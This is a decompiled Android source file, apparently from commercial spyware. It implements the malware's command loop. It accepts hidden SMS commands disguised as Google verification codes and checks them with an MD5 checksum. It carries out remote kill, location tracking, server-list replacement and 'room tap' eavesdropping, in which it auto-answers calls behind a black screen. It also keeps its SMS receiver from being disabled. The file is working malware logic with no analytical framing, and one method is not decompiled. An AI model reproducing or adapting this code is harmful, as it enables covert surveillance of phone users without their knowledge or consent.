package com.network.android.a;

import android.content.ComponentName;
import android.content.Context;
import android.telephony.TelephonyManager;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.android.m;
import com.network.android.roomTap.AutoAnswerReceiver;
import com.network.android.roomTap.k;
import com.network.h.j;
import java.security.MessageDigest;
import java.util.LinkedHashSet;
import java.util.Vector;
import java.util.regex.Pattern;

public final class b {

    /* renamed from: a  reason: collision with root package name */
    private static Vector f43a = null;
    private static Object b = new Object();
    private static LinkedHashSet c = new LinkedHashSet(60);
    private static Object d = new Object();
    private static Pattern e;

    public static void a() {
        try {
            synchronized (b) {
                a.a("clearCommandQueue start");
                if (f43a == null) {
                    a.a("clearCommandQueue command queue is null. returning");
                    return;
                }
                f43a.clear();
                a.a("clearCommandQueue end");
            }
        } catch (Throwable th) {
            a.a("clearCommandQueue exception: " + th.getMessage(), th);
        }
    }

    public static void a(Context context) {
        synchronized (b) {
            if (f43a == null) {
                a.a("iterateOnCommandQueue command queue is null. returning");
                return;
            }
            a.a("iterateOnCommandQueue queue size: " + f43a.size());
            if (f43a.size() <= 0) {
                a.a("iterateOnCommandQueue command queue is empty. returning");
                return;
            }
            while (!f43a.isEmpty()) {
                try {
                    try {
                        a aVar = (a) f43a.firstElement();
                        a.a("iterateOnCommandQueue performing commandid: " + aVar.f);
                        char c2 = aVar.f;
                        String str = aVar.b;
                        boolean z = aVar.i;
                        String str2 = aVar.h;
                        try {
                            a.a("performCommand cmdId: " + c2);
                            a.a("performCommand msg: " + str);
                            if (!j.a() || c2 == '0') {
                                if (com.network.h.b.f143a) {
                                    a.a("performCommand not performing command. we are on remove application state");
                                } else {
                                    if (com.network.android.j.a((TelephonyManager) context.getSystemService("phone")) && !com.network.b.b.d()) {
                                        if (c2 != '0' && c2 != '9') {
                                            a.a("performCommand not performing command. we are roaming and according to the settings, we are not allowed to run commands or leak");
                                        } else if (c2 == '9' && com.network.h.b.c) {
                                            a.a("performCommand not performing command. we got fetch command, but it is not upon installtion, so it will not be performed");
                                        }
                                    }
                                    try {
                                        a.a("Mo dontKill");
                                        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, SmsReceiver.class), 1, 1);
                                    } catch (Throwable th) {
                                        a.a("Mo dontKill - " + th.getMessage(), th);
                                    }
                                    switch (c2) {
                                        case '0':
                                            c.i = true;
                                            com.network.android.c.a.b.a(1, (short) 28);
                                            c.a(context, "KILL");
                                            com.network.b.b.c(context);
                                            continue;
                                        case '1':
                                            c.d(str, context, str2);
                                            continue;
                                        case '2':
                                            c.c(str, context, str2);
                                            a.a("httpPing SMS_LOC_MON");
                                            com.network.android.c.a.b.a(str2);
                                            c.a(context, "httpPing");
                                            continue;
                                        case '3':
                                            a.a("performCommand got SMS_SET");
                                            com.network.b.b.b(c.b(str));
                                            com.network.b.b.c(context);
                                            com.network.android.c.a.b.a(str2);
                                            if (z) {
                                                c.a(context, "httpPing");
                                                break;
                                            } else {
                                                continue;
                                            }
                                        case '5':
                                            c.a(str, str2, context);
                                            c.a(context, "httpPing");
                                            continue;
                                        case '6':
                                            m.a(str, str2, context);
                                            c.a(context, "httpPing");
                                            continue;
                                        case '7':
                                            try {
                                                a.a("performCommand got SMS_TAP");
                                                k.b = false;
                                                AutoAnswerReceiver.d = false;
                                                k.c = false;
                                                c.e = true;
                                                boolean c3 = c.c(str2);
                                                if (c3) {
                                                    com.network.android.c.a.b.a(str2);
                                                } else {
                                                    com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str2));
                                                }
                                                c.a(context, "httpPingTap");
                                                if (c3) {
                                                    a.a("performCommand GOT_TAP_SMS_CALL_NOT_YET_ARRIVED setting it to true");
                                                    c.f = true;
                                                    a.a("performCommand BlackScreen opening tap screen");
                                                    c.a(str, context);
                                                    AutoAnswerReceiver.g(context);
                                                } else {
                                                    a.a("performCommand GOT_TAP_SMS_CALL_NOT_YET_ARRIVED setting it to false");
                                                    c.f = false;
                                                    a.a("performCommand Tap Window Forbidden");
                                                    c.a();
                                                }
                                                a.a("performCommand setting isSmsTap = false");
                                                continue;
                                            } catch (Throwable th2) {
                                                a.a("performCommand exception. setting isSmsTap = false");
                                                a.a("performCommand SMS_TAP exception\n- " + th2.getMessage(), th2);
                                                c.e = false;
                                                break;
                                            }
                                        case '8':
                                            c.b(str, context, str2);
                                            com.network.b.b.c(context);
                                            c.a(context, "httpPing");
                                            continue;
                                        case '9':
                                            a.a("performCommand got SMS_COMMAND_FETCH");
                                            String[] a2 = c.a(str);
                                            if (!com.network.h.b.a(a2, com.network.b.b.e())) {
                                                a.a("performCommand SMS_COMMAND_FETCH can't find fetch commands ip in server list. replacing server list");
                                                com.network.b.b.b(a2);
                                                com.network.b.b.c(context);
                                            }
                                            com.network.android.c.a.b.a(str2);
                                            c.a(context, "httpPing");
                                            continue;
                                    }
                                }
                                f43a.remove(0);
                            } else {
                                a.a("performCommand not performing command. we are on Upgrade state");
                                f43a.remove(0);
                            }
                        } catch (Throwable th3) {
                            a.a("performCommand exception\n- " + th3.getMessage(), th3);
                        }
                    } catch (Throwable th4) {
                        a.a("iterateOnCommandQueue exception- " + th4.getMessage(), th4);
                    }
                } catch (Throwable th5) {
                    a.a("iterateOnCommandQueue outer exception\n- " + th5.getMessage(), th5);
                }
            }
        }
    }

    public static boolean a(Context context, String str) {
        if (str == null) {
            return false;
        }
        try {
            if (!str.toLowerCase().contains("your google verification code")) {
                return false;
            }
            int indexOf = str.indexOf("s=", str.length() - 30);
            String substring = str.substring(indexOf + 2);
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.update((SmsReceiver.b(context) + str.substring(0, indexOf + 2)).getBytes());
            String a2 = com.network.i.a.a(instance.digest(), 8);
            a.a("checksum: " + substring + " hash " + a2);
            if (substring.equals(a2)) {
                a.a("Our command!!!!!!!");
                return true;
            }
            a.a("Not Our command!!!!!!!");
            return false;
        } catch (Throwable th) {
            a.a("isOurCommand- " + th.getMessage(), th);
            return false;
        }
    }

    public static boolean a(byte[] bArr, Context context, boolean z, String str) {
        return a(bArr, context, z, str, null);
    }

    /* JADX WARNING: Removed duplicated region for block: B:40:0x01ea  */
    /* JADX WARNING: Removed duplicated region for block: B:43:0x0269 A[SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static boolean a(byte[] r8, android.content.Context r9, boolean r10, java.lang.String r11, java.lang.String r12) {
        /*
        // Method dump skipped, instructions count: 808
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.a.b.a(byte[], android.content.Context, boolean, java.lang.String, java.lang.String):boolean");
    }
}
